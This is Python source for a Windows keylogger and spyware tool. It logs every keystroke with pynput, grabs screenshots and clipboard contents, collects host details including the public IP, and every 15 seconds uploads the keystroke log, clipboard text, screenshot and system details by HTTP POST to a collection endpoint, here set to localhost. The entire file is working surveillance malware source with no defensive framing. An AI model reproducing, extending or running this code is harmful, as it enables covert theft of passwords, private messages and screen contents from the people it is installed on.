from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write

from cryptography.fernet import Fernet

import getpass
from requests import get, post

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_log = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
# audio_information = "audio.mp3"
screenshot_information = "screenshot.png"

microphone_time = 10
file_path = "."
extend = "\\"
file_merge = file_path + extend
url = 'http://localhost:8000/api/data'


def send_data():
    print('sending data ... \n')
    files = {
        "keylog": open("key_log.txt", "rb"),
        # "audio": open("audio.mp3", "rb"),
        "clipboard": open("clipboard.txt", "rb"),
        "screenshot": open("screenshot.png", 'rb'),
        "sysinfo": open('systeminfo.txt', 'rb')
    }
    response = post(url, files=files)
    if response.ok:
        print("data sent successfully!")
    else:
        print("Something went wrong!")

# get the computer information


def computer_information():
    with open(file_path + extend + system_information, "w") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query \n")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() +
                " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

# get the clipboard contents


def copy_clipboard():
    global file_path, extend, clipboard_information
    with open(file_path + extend + clipboard_information, "w") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

# get screenshots


def screenshot():
    global file_path, extend, screenshot_information
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)


def on_press(key):
    global keys, count, currentTime

    print(key)
    keys.append(key)
    count += 1
    currentTime = time.time()

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path + extend + keys_log, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    global currentTime, stoppingTime
    if key == Key.esc:
        return False
    if currentTime > stoppingTime:
        return False


time_iteration = 15

number_of_iterations = 0
limit = 3
currentTime = time.time()
stoppingTime = time.time() + time_iteration

# create empty file
with open(file_path + extend + keys_log, "w") as f:
    f.write("")

# Timer for keylogger
while number_of_iterations < limit:

    count = 0
    keys = []

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        screenshot()
        copy_clipboard()
        computer_information()
        # send data
        send_data()

        with open(file_path + extend + keys_log, "w") as f:
            f.write("")
        number_of_iterations += 1
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration
    else:
        continue
